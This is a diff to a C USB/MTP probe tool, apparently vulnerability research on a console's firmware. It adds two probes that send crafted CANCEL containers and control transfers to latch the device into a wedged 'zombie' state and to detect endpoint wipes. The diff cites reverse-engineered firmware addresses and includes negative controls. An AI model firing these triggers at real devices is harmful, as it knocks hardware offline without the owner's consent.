@@ -625,6 +625,20 @@ static int raw_bulk_write(Dev *d, const void *buf, int len)
     return (rc == LIBUSB_SUCCESS && xfr == len) ? 0 : -1;
 }
 
+/* journal a raw buffer as hex (max 64 bytes) — byte-level provenance for
+ * every container the wire actually delivered (v5) */
+static void jhex(const char *tag, const unsigned char *p, int n)
+{
+    char hex[2 * 64 + 1];
+    int i;
+    if (n < 0) n = 0;
+    if (n > 64) n = 64;
+    for (i = 0; i < n; i++)
+        snprintf(hex + 2 * i, 3, "%02x", p[i]);
+    hex[2 * n] = 0;
+    jr("%s_hex\":\"%s\"", tag, hex);
+}
+
 /* send a request container WITHOUT any transaction machinery */
 static uint16_t raw_sendreq(Dev *d, const char *tag, uint16_t code,
                             int nparam, const uint32_t *pv, int dataphase)
@@ -1105,6 +1119,367 @@ static uint16_t p_banded_unknowns(Dev *d)
     return RC_OK;
 }
 
+/* ------------------------------------------------------------------ */
+/* corpus v4 — the SIC CANCEL control-transfer gate (finding:           */
+/* neighboring-word decode inside the CANCEL gate, event pump           */
+/* fcn.0001e3e8 @ capmtp vaddr 0x1e6ac-0x1e6d0, latch stlrb @0x1e978,   */
+/* dual endpoint-session cancel @0x1e97c-0x1e9c4).                      */
+
+/*
+ * One libusb_control_transfer = one USB control transaction:
+ *   SETUP packet : 21 64 00 00 00 00 06 00
+ *                  (bmRequestType 0x21 host-to-interface class,
+ *                   bRequest 0x64 SIC CANCEL, wValue 0x0000,
+ *                   wIndex 0x0000, wLength 0x0006 — all LE on wire)
+ *   OUT data     : 6 bytes, word0 = first LE u16 compared @0x1e6b4,
+ *                  remaining 4 (txid) bytes UNCHECKED.
+ * This is the CANONICAL route (byte-identical to libmtp's
+ * ptp_usb_control_cancel_request, libusb1-glue.c:1854-1870) — the
+ * route any real host library uses — unlike v3's cancel_injection
+ * which fired the gate via a bulk container's length word.
+ *
+ * Single-shot decisive design (each wedge costs a console-side flow
+ * restart, so the experiment is controlled WITHIN one connection):
+ *   1. pre-flight health; abort unless 0x2001 (never fire on a
+ *      non-clean device — the shot would prove nothing and still
+ *      cost the restart).
+ *   2. NEGATIVE CONTROL: data 02 40 00 00 00 00 (word0=0x4002).
+ *      Passes every check the firmware makes before the word0
+ *      compare (bRequest 0x64 @0x1e644, bmRequestType 0x21 @0x1e64c,
+ *      wValue==0 @0x1e658, wIndex==0 @0x1e660, wLength==6 @0x1e668,
+ *      6-byte data read @0x1e68c, free CAS lock @0x1e6a4) — only the
+ *      word0 compare fails -> b.ne 0x1e6d0 -> silent consume, lock
+ *      released, NO state change, NO cancel. Expect rc=6 (data phase
+ *      ACKed below the pump) and health still 0x2001.
+ *   3. THE SHOT: data 01 40 00 00 00 00 (word0=0x4001, txid bytes
+ *      zero: no active transaction exists to cancel from a clean
+ *      state, and the firmware never looks at these bytes anyway).
+ *      If the finding holds: latch [ctx+1]=2 @0x1e978 + cancel of
+ *      BOTH endpoint sessions @0x1e97c-0x1e9c4 -> zombie.
+ *   4. post-shot health: != 0x2001 (live precedent: fast 0x02ff,
+ *      runs/mtp-libptp-20261111T185552Z.jsonl) = HIT.
+ *
+ * The two control transfers differ in exactly ONE wire byte
+ * (data byte 0: 0x02 vs 0x01) — that is the controlled experiment
+ * for the logic-only word0 decode. No reset is issued after the
+ * shot (a reset on a latched device drops the console off the bus,
+ * runs/mtp-libptp-20261111T184331Z.jsonl).
+ */
+static int raw_control_cancel(Dev *d, const char *tag,
+                              const unsigned char data6[6])
+{
+    int rc = libusb_control_transfer(d->ptp_usb->handle,
+                                     0x21,    /* class | interface, H2D */
+                                     0x64,    /* bRequest: SIC CANCEL  */
+                                     0x0000,  /* wValue (must be 0)    */
+                                     0x0000,  /* wIndex (must be 0; == interface 0) */
+                                     (unsigned char *)data6,
+                                     6,       /* wLength (must be 6)   */
+                                     5000);
+    jr("control_cancel\":{\"tag\":\"%s\",\"setup\":\"21 64 00 00 00 00 "
+       "06 00\",\"data\":\"%02x %02x %02x %02x %02x %02x\",\"rc\":%d,"
+       "\"detail\":\"%s\"",
+       tag, data6[0], data6[1], data6[2], data6[3], data6[4], data6[5], rc,
+       rc == 6 ? "data phase ACKed (transport delivered it to the pump)"
+       : rc < 0 ? "STALL/rejected below the pump (reachability refuted "
+       "at the transport layer)" : "short transfer");
+    return rc;
+}
+
+static uint16_t p_cancel_control_gate(Dev *d)
+{
+    static const unsigned char neg[6]  = {0x02, 0x40, 0, 0, 0, 0}; /* 0x4002 */
+    static const unsigned char shot[6] = {0x01, 0x40, 0, 0, 0, 0}; /* 0x4001 */
+    uint16_t pre, post_neg, post;
+    int rc_neg, rc_shot;
+
+    /* 1. pre-flight: only fire from a verified-clean state */
+    pre = xfer(d, "pre-flight health", OC_GETSTORAGEIDS, 0, NULL, 1);
+    if (pre != RC_OK) {
+        jr("cancel_control_gate_verdict\":\"ABORT — device not clean "
+           "(pre-flight 0x%04x); shot NOT fired (a wedge costs a "
+           "console-side flow restart)", pre);
+        return pre;
+    }
+
+    /* 2. negative control: word0=0x4002 — every gate check passes,
+     * the word0 compare fails -> silent consume, zero state change */
+    rc_neg = raw_control_cancel(d, "negative-control word0=0x4002", neg);
+    post_neg = xfer(d, "post-negative-control health", OC_GETSTORAGEIDS, 0,
+                    NULL, 1);
+    if (post_neg != RC_OK) {
+        jr("cancel_control_gate_verdict\":\"DIFFERENT-BUG — the CANCEL "
+           "control path wedged even for word0=0x4002 (health 0x%04x, "
+           "rc %d); word0 discrimination NOT established; shot not "
+           "fired", post_neg, rc_neg);
+        return post_neg;
+    }
+    jr("negative_control\":\"rc %d, health 0x%04x — the gate consumed a "
+       "non-0x4001 CANCEL silently (lock cycled, no state change, no "
+       "cancel)", rc_neg, post_neg);
+
+    /* 3. THE SHOT: word0=0x4001 — identical SETUP, one data byte
+     * differs (0x02 -> 0x01) */
+    rc_shot = raw_control_cancel(d, "SHOT word0=0x4001", shot);
+    sleep(1);                       /* corpus convention: latch settle */
+
+    /* 4. post-shot health: the oracle */
+    post = xfer(d, "post-shot health", OC_GETSTORAGEIDS, 0, NULL, 1);
+    if (post != RC_OK) {
+        jr("cancel_control_gate_verdict\":\"HIT — zombie latched from a "
+           "clean state via the CONTROL-transfer CANCEL route "
+           "(negative control harmless: rc %d, health 0x%04x; shot: rc "
+           "%d, health 0x%04x) — the only wire difference between the "
+           "two transfers is data byte 0: 0x02 vs 0x01, so the "
+           "word0==0x4001 branch (latch @0x1e978 + dual cancel "
+           "@0x1e97c-0x1e9c4) is what fired",
+           rc_neg, post_neg, rc_shot, post);
+    } else {
+        jr("cancel_control_gate_verdict\":\"MISS — word0=0x4001 via the "
+           "control route left health 0x%04x (gate did not latch; "
+           "rc neg %d / shot %d)", post, rc_neg, rc_shot);
+    }
+    return post;
+}
+
+/* ------------------------------------------------------------------ */
+/* corpus v5 — the WIPE-CHAIN watch (confirmed finding: capmtp latch    */
+/* raw 0x1e878 -> dual ds endpoint-session cancel raw 0x1e894-0x1e8dc   */
+/* -> usbsys DsControllerOunce endpoint-cancel/wipe FUN_000a3a40 via    */
+/* vtable 0xe9f30+0x58 inside state machine FUN_0002cbe0).              */
+/*                                                                      */
+/* v3's cancel_injection proved the LATCH from clean state (fast canned */
+/* 0x2ff, runs/mtp-libptp-20261111T185552Z.jsonl); v4's                 */
+/* cancel_control_gate covers the CONTROL-transfer route. NEITHER       */
+/* observed whether the latch's dual endpoint-session cancel actually   */
+/* reaches the usbsys wipe — the finding's own reachability note: the   */
+/* IPC hop from endpoint-session cancel to state-machine arm was       */
+/* "established structurally (sole call graph) but not single-stepped". */
+/* The finding's wipe sequence gives two host-visible fingerprints:      */
+/*   - IN side: endpoint-session struct zeroed + 0x1000-byte buffer     */
+/*     memset + 64-byte endpoint context/ring slot zeroed + halt/re-arm */
+/*     => a QUEUED-BUT-UNDELIVERED data phase is destroyed (zeroed     */
+/*     bytes through a surviving armed TRB, truncated, or nothing);     */
+/*   - OUT side: session zeroed AND the engine bails 0x177ae3 BEFORE    */
+/*     posting any buffer (raw 0x24a50-0x24a6c) => command writes stop */
+/*     completing (a bulk OUT completes only against a posted buffer). */
+/*                                                                      */
+/* Single-shot decisive design (one wedge max, all on ONE connection):  */
+/*   1. pre-flight health; abort unless 0x2001 (never fire on a dirty   */
+/*      device — the shot would prove nothing and still cost the        */
+/*      console-side flow restart).                                     */
+/*   2. QUEUE a known data phase on IN: hand-built GetStorageIDs       */
+/*      command (~20-byte DATA answer, <1ms live), deliberately NOT    */
+/*      read. This is also the finding's mismatch-of-state condition   */
+/*      (data phase pending, host never consumes it).                   */
+/*   3. THE SHOT: 12-byte container, word0=0x00004001, on the command   */
+/*      pipe — byte-identical to v3's confirmed trigger.                */
+/*   4. t+1s IN oracle read: intact DATA container (type=2, code=       */
+/*      0x1004, txid echo) = queued data SURVIVED; zero-filled = the    */
+/*      0x1000-buffer memset fingerprint; truncated/nothing = halt +    */
+/*      ring wipe; type=3 0x2ff = synthesizer answered instead.         */
+/*   5. OUT-liveness watch to ~+27s (past the 20s timer seen live in    */
+/*      runs/mtp-libptp-20261111T184649Z.jsonl): one hand-built command */
+/*      write + one IN poll per round. write->LIBUSB_ERROR_TIMEOUT      */
+/*      transition = OUT starved of posted TRBs = the wipe chain fired; */
+/*      IN polls catch any late engine-authored stale delivery (the     */
+/*      finding's live-only observation, now controlled).               */
+/*   6. verdict: HIT (wipe fingerprints) / LATCH-ONLY (zombie but no    */
+/*      wipe: the IPC hop is refuted for this route) / MISS (no latch). */
+static int watch_write(Dev *d, const void *buf, int len, int timeout_ms)
+{
+    int xfr = 0;
+    int rc = libusb_bulk_transfer(d->ptp_usb->handle, d->ptp_usb->outep,
+                                  (unsigned char *)buf, len, &xfr,
+                                  timeout_ms);
+    return (rc == LIBUSB_SUCCESS && xfr == len) ? 0 : rc;
+}
+
+static uint16_t p_cancel_wipe_watch(Dev *d)
+{
+    unsigned char cmd[12], shot[12], buf[64];
+    uint32_t q_tx;
+    uint16_t pre;
+    double t_shot;
+    int got, in_intact = 0, in_wiped = 0, ever_2ff = 0, stale = 0;
+    int write_fail = 0, write_ok = 0, round;
+    static const int N_ROUNDS = 8;
+
+    /* 1. pre-flight: only fire from a verified-clean state */
+    pre = xfer(d, "pre-flight health", OC_GETSTORAGEIDS, 0, NULL, 1);
+    if (pre != RC_OK) {
+        jr("cancel_wipe_watch_verdict\":\"ABORT — device not clean "
+           "(pre-flight 0x%04x); shot NOT fired (a wedge costs a "
+           "console-side flow restart)", pre);
+        return pre;
+    }
+
+    /* 2. queue a known data phase on IN, deliberately unread */
+    q_tx = d->params.transaction_id++;
+    ((uint32_t *)cmd)[0] = 12;                 /* length */
+    ((uint16_t *)cmd)[2] = 1;                  /* type: COMMAND */
+    ((uint16_t *)cmd)[3] = OC_GETSTORAGEIDS;   /* 0x1004 */
+    ((uint32_t *)cmd)[2] = q_tx;               /* trans_id */
+    if (raw_bulk_write(d, cmd, 12) != 0) {
+        jr("cancel_wipe_watch_verdict\":\"ABORT — queue-command write "
+           "failed before the shot (pipe not clean)");
+        return PTP_RC_GeneralError;
+    }
+    usleep(200000);      /* engine posts the DATA phase in <1ms live */
+    jr("queue\":\"GetStorageIDs DATA phase queued on IN, unread\","
+       "\"txid\":\"0x%08x\",\"expected\":\"type=2 code=0x1004 txid echo "
+       "(~20 bytes)", q_tx);
+
+    /* 3. THE SHOT — word0=0x4001 container on the command pipe,
+     * byte-identical to v3's confirmed trigger */
+    memset(shot, 0, sizeof(shot));
+    ((uint32_t *)shot)[0] = 0x00004001u;
+    if (raw_bulk_write(d, shot, 12) != 0) {
+        jr("cancel_wipe_watch_verdict\":\"ABORT — the 0x4001 shot write "
+           "itself failed (OUT already starved before firing?)");
+        return PTP_RC_GeneralError;
+    }
+    t_shot = now_ms();
+    jr("shot\":\"word0=0x00004001 sent on command pipe (type/code/txid "
+       "zero), 12 bytes");
+    sleep(1);            /* latch settle + async state-machine arm */
+
+    /* 4. IN oracle: what happened to the queued data phase? */
+    got = raw_bulk_read(d, buf, sizeof(buf), 5000);
+    jhex("in_oracle", buf, got);
+    if (got >= 12) {
+        jr("in_oracle\":\"len_field\":\"0x%08x\",\"type\":\"0x%04x\","
+           "\"code\":\"0x%04x\",\"txid_echo\":\"0x%08x\",\"elapsed_ms\":"
+           "%.2f", ((uint32_t *)buf)[0], ((uint16_t *)buf)[2],
+           ((uint16_t *)buf)[3], ((uint32_t *)buf)[2], now_ms() - t_shot);
+        if (((uint16_t *)buf)[2] == 2 &&
+            ((uint16_t *)buf)[3] == OC_GETSTORAGEIDS &&
+            ((uint32_t *)buf)[2] == q_tx) {
+            in_intact = 1;
+            jr("in_oracle_verdict\":\"queued DATA phase SURVIVED the "
+               "cancel — IN endpoint session not wiped (or its single "
+               "armed TRB was already pre-fetched; ambiguous alone, the "
+               "OUT watch below is the confound-free oracle)");
+        } else if (((uint16_t *)buf)[2] == 3 &&
+                   ((uint16_t *)buf)[3] == PTP_ERROR_IO) {
+            ever_2ff = 1;
+            jr("in_oracle_verdict\":\"canned 0x2ff RESPONSE displaced the "
+               "queued data — transport synthesizer live, latch fired");
+        } else {
+            in_wiped = 1;
+            jr("in_oracle_verdict\":\"queued data DESTROYED (zero-filled/"
+               "garbage bytes) — the 0x1000-buffer memset + ring wipe "
+               "fingerprint");
+        }
+        if (((uint16_t *)buf)[2] == 3 && ((uint32_t *)buf)[2] == q_tx) {
+            stale = 1;
+            jr("stale_delivery\":\"engine-authored container for the "
+               "queued txid arrived %.2fms AFTER the cancel — armed-TRB "
+               "survival through the wipe, now controlled", 
+               now_ms() - t_shot);
+        }
+    } else {
+        in_wiped = 1;
+        jr("in_oracle_verdict\":\"NOTHING/truncated readable on IN 1s "
+           "after the cancel — endpoint halted / armed TRBs wiped "
+           "(queued data gone)");
+    }
+
+    /* 5. OUT-liveness watch past the 20s timer: one hand-built command
+     * write + one IN poll per round. The write's own completion is the
+     * TRB-starvation oracle; the IN poll catches late stale delivery
+     * even when writes fail. */
+    for (round = 0; round < N_ROUNDS; round++) {
+        uint32_t tx = d->params.transaction_id++;
+        int wrc;
+        ((uint32_t *)cmd)[0] = 12;
+        ((uint16_t *)cmd)[2] = 1;
+        ((uint16_t *)cmd)[3] = OC_GETSTORAGEIDS;
+        ((uint32_t *)cmd)[2] = tx;
+        wrc = watch_write(d, cmd, 12, 3000);
+        if (wrc == 0) {
+            write_ok++;
+            got = raw_bulk_read(d, buf, sizeof(buf), 2000);
+            jhex("watch", buf, got);
+            if (got >= 12) {
+                if (((uint16_t *)buf)[3] == PTP_ERROR_IO) ever_2ff = 1;
+                if (((uint16_t *)buf)[2] == 3 &&
+                    ((uint32_t *)buf)[2] == q_tx) {
+                    stale = 1;
+                    jr("stale_delivery\":\"engine-authored container for "
+                       "the queued txid arrived %.2fms AFTER the cancel",
+                       now_ms() - t_shot);
+                }
+                jr("watch\":{\"round\":%d,\"elapsed_ms\":%.2f,"
+                   "\"write\":\"ok\",\"read\":%d,\"type\":\"0x%04x\","
+                   "\"code\":\"0x%04x\"}", round, now_ms() - t_shot, got,
+                   ((uint16_t *)buf)[2], ((uint16_t *)buf)[3]);
+            } else {
+                jr("watch\":{\"round\":%d,\"elapsed_ms\":%.2f,"
+                   "\"write\":\"ok\",\"read\":%d}", round,
+                   now_ms() - t_shot, got);
+            }
+        } else {
+            write_fail++;
+            got = raw_bulk_read(d, buf, sizeof(buf), 2000); /* stale? */
+            jhex("watch", buf, got);
+            if (got >= 12 && ((uint16_t *)buf)[2] == 3 &&
+                ((uint32_t *)buf)[2] == q_tx) {
+                stale = 1;
+                jr("stale_delivery\":\"engine-authored container for the "
+                   "queued txid arrived %.2fms AFTER the cancel",
+                   now_ms() - t_shot);
+            }
+            jr("watch\":{\"round\":%d,\"elapsed_ms\":%.2f,\"write\":"
+               "\"FAILED rc=%d (OUT starved of posted TRBs — the wipe "
+               "chain's OUT fingerprint)\",\"read\":%d}", round,
+               now_ms() - t_shot, wrc, got);
+        }
+        if (round < N_ROUNDS - 1) sleep(3);
+    }
+
+    /* 6. verdict — every branch carries its evidence */
+    if (write_fail && write_ok) {
+        jr("cancel_wipe_watch_verdict\":\"HIT (A->B transition) — OUT "
+           "writes completed (canned 0x2ff) then began timing out "
+           "%.2fms after the 0x4001 shot: the dual endpoint-session "
+           "cancel reached the usbsys wipe (FUN_000a3a40), the endpoint "
+           "was halted/zeroed/re-armed, and no new TRBs get posted "
+           "(engine bails 0x177ae3 before posting) — the IPC hop runs "
+           "on the direct latch route too",
+           now_ms() - t_shot);
+    } else if (write_fail && !write_ok) {
+        jr("cancel_wipe_watch_verdict\":\"HIT (immediate) — OUT already "
+           "starved at the first watch round: the wipe completed within "
+           "~4s of the shot; IN oracle above says what happened to the "
+           "queued data");
+    } else if (in_wiped) {
+        jr("cancel_wipe_watch_verdict\":\"HIT (IN-side) — the queued "
+           "data phase was destroyed (memset/ring-wipe fingerprint) "
+           "while OUT writes still completed: the endpoint-session "
+           "cancel wiped the IN session; the usbsys chain fired");
+    } else if (ever_2ff) {
+        jr("cancel_wipe_watch_verdict\":\"LATCH-ONLY — zombie confirmed "
+           "(canned 0x2ff) but the queued IN data %s AND OUT writes "
+           "completed for the full ~27s window: the dual endpoint-"
+           "session cancel did NOT reach the usbsys wipe from the "
+           "direct word0=0x4001 route — the finding's IPC-hop claim is "
+           "refuted for this trigger (the desync route's Phase B must "
+           "come from a different state-machine arm)",
+           stale ? "was stale-delivered late" :
+           in_intact ? "SURVIVED intact" : "was displaced");
+    } else if (in_intact) {
+        jr("cancel_wipe_watch_verdict\":\"MISS — no latch: the 0x4001 "
+           "container was consumed as noise on this route (queued data "
+           "intact, writes clean, no 0x2ff)");
+    } else {
+        jr("cancel_wipe_watch_verdict\":\"UNRESOLVED — see the raw "
+           "in_oracle/watch journal lines above; re-run with the hex "
+           "evidence before spending another wedge");
+    }
+    return ever_2ff ? PTP_ERROR_IO : RC_OK;
+}
+
 static void corpus_init(void)
 {
     if (n_probes) return;
@@ -1135,6 +1510,11 @@ static void corpus_init(void)
     reg("cancel_injection", p_cancel_injection);
     reg("ring_saturation", p_ring_saturation);
     reg("banded_unknowns_zombie", p_banded_unknowns);
+    /* corpus v4 (SIC CANCEL control-transfer gate, word0 decode) */
+    reg("cancel_control_gate", p_cancel_control_gate);
+    /* corpus v5 (wipe-chain watch: latch -> ds session cancel -> usbsys
+     * wipe FUN_000a3a40; queued-IN oracle + OUT TRB-starvation watch) */
+    reg("cancel_wipe_watch", p_cancel_wipe_watch);
 }
 
 
@@ -1333,9 +1713,9 @@ static int self_test(void)
 {
     int ok = 1;
     corpus_init();
-    printf("  %-48s %s\n", "corpus v3 size (v1 14 + v2 5 + v3 6)",
-           n_probes == 25 ? "PASS" : "FAIL");
-    ok &= (n_probes == 25);
+    printf("  %-48s %s\n", "corpus v5 size (v1 14 + v2 5 + v3 6 + v4 1 + v5 1)",
+           n_probes == 27 ? "PASS" : "FAIL");
+    ok &= (n_probes == 27);
     printf("  %-48s %s\n", "opcode values",
            (OC_GETTHUMB == 0x100a && OC_GETOBJECT == 0x1009 &&
             OC_GETHANDLES == 0x1007) ? "PASS" : "FAIL");
@@ -1375,6 +1755,14 @@ static int self_test(void)
            strcmp(PROBES[22].name, "cancel_injection") == 0 &&
            strcmp(PROBES[23].name, "ring_saturation") == 0 &&
            strcmp(PROBES[24].name, "banded_unknowns_zombie") == 0);
+    printf("  %-48s %s\n", "v4 addition registered",
+           strcmp(PROBES[25].name, "cancel_control_gate") == 0
+           ? "PASS" : "FAIL");
+    ok &= (strcmp(PROBES[25].name, "cancel_control_gate") == 0);
+    printf("  %-48s %s\n", "v5 addition registered",
+           strcmp(PROBES[26].name, "cancel_wipe_watch") == 0
+           ? "PASS" : "FAIL");
+    ok &= (strcmp(PROBES[26].name, "cancel_wipe_watch") == 0);
     printf("mtp_probe_libpt2 self-test: %s\n", ok ? "PASS" : "FAIL");
     return ok ? 0 : 1;
 }
@@ -1388,7 +1776,13 @@ static void usage(void)
         "[--runs-dir DIR] [--wait SEC]\n"
         "corpus: v1 (14, == mtp_probe.py) + v2 (5) + v3 (6, audit-directed:\n"
         "  capture_02ff_container, session_id_abuse, zombie_alternation,\n"
-        "  cancel_injection, ring_saturation, banded_unknowns_zombie)\n");
+        "  cancel_injection, ring_saturation, banded_unknowns_zombie)\n"
+        "+ v4 (1: cancel_control_gate — SIC CANCEL control-transfer gate,\n"
+        "  negative-control word0=0x4002 then the 0x4001 shot, one byte\n"
+        "  apart, single connection; fires ONLY from a verified-clean state)\n"
+        "+ v5 (1: cancel_wipe_watch — latch -> ds session cancel -> usbsys\n"
+        "  wipe FUN_000a3a40: queue a data phase, fire 0x4001, oracle the\n"
+        "  queued-IN bytes + watch OUT writes past the 20s timer)\n");
 }
 
 int main(int argc, char **argv)
